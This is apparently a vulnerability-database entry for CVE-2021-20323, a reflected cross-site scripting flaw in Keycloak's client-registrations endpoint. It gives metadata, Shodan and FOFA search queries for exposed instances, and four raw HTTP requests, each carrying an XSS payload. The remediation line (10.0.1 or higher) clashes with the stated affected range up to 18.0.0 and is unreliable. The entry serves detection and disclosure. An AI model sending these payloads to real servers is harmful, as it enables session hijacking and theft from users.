---
layout: post
cve_id: CVE-2021-20323
title: Keycloak 10.0.0 - 18.0.0 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2021/CVE-2021-20323.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-20323.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ndmalc,incogbyte
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary JavaScript code in the context of the victim''s browser, leading
  to session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Upgrade Keycloak to a version that is not affected by the vulnerability
  (10.0.1 or higher).

  '
reference:
- https://github.com/keycloak/keycloak/security/advisories/GHSA-m98g-63qj-fp8j
- https://bugzilla.redhat.com/show_bug.cgi?id=2013577
- https://access.redhat.com/security/cve/CVE-2021-20323
- https://github.com/ndmalc/CVE-2021-20323
- https://github.com/keycloak/keycloak/commit/3aa3db16eac9b9ed8c5335ac86f5f50e0c68662d
- https://nvd.nist.gov/vuln/detail/CVE-2021-20323
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2021-20323
  cwe-id: CWE-79
  epss-score: 0.66054
  epss-percentile: 0.98451
  cpe: cpe:2.3:a:redhat:keycloak:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 4
  vendor: redhat
  product: keycloak
  shodan-query:
  - html:"Keycloak"
  - http.title:"keycloak"
  - http.html:"keycloak"
  - http.favicon.hash:-1105083093
  fofa-query:
  - title="keycloak"
  - icon_hash=-1105083093
  - body="keycloak"
  google-query: intitle:"keycloak"
tags:
- cve2021
- cve
- keycloak
- xss
- redhat
- vuln
---

## üîç Vulnerability Description
Keycloak 10.0.0 to 18.0.0 contains a cross-site scripting vulnerability via the client-registrations endpoint. On a POST request, the application does not sanitize an unknown attribute name before including it in the error response with a 'Content-Type' of text/hml. Once reflected, the response is interpreted as HTML. This can be performed on any realm present on the Keycloak instance. Since the bug requires Content-Type application/json and is submitted via a POST, there is no common path to exploit that has a user impact.


## üåê HTTP Request
```nohighlight
POST /auth/realms/master/clients-registrations/default HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
Connection: close
Content-Length: 52
Accept: */*
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{"Test<img src=x onerror=alert(document.domain)>":1}
```

```nohighlight
POST /auth/realms/master/clients-registrations/openid-connect HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 52
Accept: */*
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{"Test<img src=x onerror=alert(document.domain)>":1}
```

```nohighlight
POST /realms/master/clients-registrations/default HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Connection: close
Content-Length: 52
Accept: */*
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{"Test<img src=x onerror=alert(document.domain)>":1}
```

```nohighlight
POST /realms/master/clients-registrations/openid-connect HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.11 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 52
Accept: */*
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{"Test<img src=x onerror=alert(document.domain)>":1}
```

